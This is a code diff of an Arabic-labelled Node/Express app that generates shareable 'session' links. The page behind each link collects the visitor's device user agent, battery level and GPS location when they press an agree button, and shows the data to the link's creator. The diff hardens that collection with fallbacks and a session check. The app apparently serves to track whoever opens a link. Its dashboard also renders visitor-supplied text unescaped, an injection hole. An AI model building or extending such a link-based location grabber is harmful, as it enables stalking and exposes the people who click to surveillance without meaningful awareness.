@@ -11,7 +11,7 @@ let sessions = {}
 /* الصفحة الرئيسية */
 /* ===================== */
 
-app.get("/", (req,res)=>{
+app.get("/", (req, res) => {
 
 res.send(`
 <html>
@@ -43,6 +43,7 @@ background:#1e293b;
 padding:20px;
 border-radius:12px;
 margin-top:20px;
+word-break:break-all;
 }
 </style>
 
@@ -60,11 +61,11 @@ margin-top:20px;
 function create(){
 
 fetch("/create")
-.then(r=>r.json())
-.then(data=>{
+.then(r => r.json())
+.then(data => {
 
-document.getElementById("result").innerHTML = 
-"<div class='box'>رابط الجلسة:<br><br>"+data.link+"</div>"
+document.getElementById("result").innerHTML =
+"<div class='box'>رابط الجلسة:<br><br><a style='color:#22c55e' href='"+data.link+"' target='_blank'>"+data.link+"</a></div>"
 
 })
 
@@ -119,16 +120,18 @@ style="padding:12px 20px;border:none;border-radius:8px;background:#22c55e;color:
 موافق
 </button>
 
+<p id="status"></p>
+
 <script>
 
 function send(){
 
-navigator.getBattery().then(function(b){
+document.getElementById("status").innerText = "جاري جمع البيانات..."
 
-let battery = b.level * 100
 let device = navigator.userAgent
+let battery = "غير مدعوم"
 
-navigator.geolocation.getCurrentPosition(function(pos){
+function sendData(lat, lon){
 
 fetch("/collect",{
 method:"POST",
@@ -137,19 +140,62 @@ body:JSON.stringify({
 id:"${id}",
 device:device,
 battery:battery,
-lat:pos.coords.latitude,
-lon:pos.coords.longitude,
+lat:lat,
+lon:lon,
 time:new Date().toLocaleString()
 })
 })
-
 .then(()=>{
 document.body.innerHTML="<h2>تم الإرسال بنجاح ✅</h2>"
 })
 
-})
+}
+
+/* ===== البطارية ===== */
+
+if(navigator.getBattery){
+
+navigator.getBattery().then(function(b){
+battery = b.level * 100
+
+/* ===== الموقع ===== */
+
+if(navigator.geolocation){
+
+navigator.geolocation.getCurrentPosition(function(pos){
+
+sendData(pos.coords.latitude, pos.coords.longitude)
+
+}, function(){
+
+alert("تم رفض إذن الموقع ❌")
+sendData("رفض","رفض")
 
 })
+
+}
+
+})
+
+} else {
+
+/* لو البطارية غير مدعومة */
+
+if(navigator.geolocation){
+
+navigator.geolocation.getCurrentPosition(function(pos){
+
+sendData(pos.coords.latitude, pos.coords.longitude)
+
+}, function(){
+
+sendData("رفض","رفض")
+
+})
+
+}
+
+}
 
 }
 
@@ -165,6 +211,10 @@ document.body.innerHTML="<h2>تم الإرسال بنجاح ✅</h2>"
 /* ===================== */
 
 app.post("/collect",(req,res)=>{
+
+if(!sessions[req.body.id]){
+return res.json({error:"جلسة غير موجودة"})
+}
 
 sessions[req.body.id] = req.body
 
@@ -195,7 +245,7 @@ res.send(`
 
 <h2>📊 معلومات الجلسة</h2>
 
-<div style="background:#1e293b;padding:20px;border-radius:12px">
+<div style="background:#1e293b;padding:20px;border-radius:12px;word-break:break-all;">
 
 <p><b>الجهاز:</b><br>${data.device}</p>
 <p><b>البطارية:</b> ${data.battery}%</p>
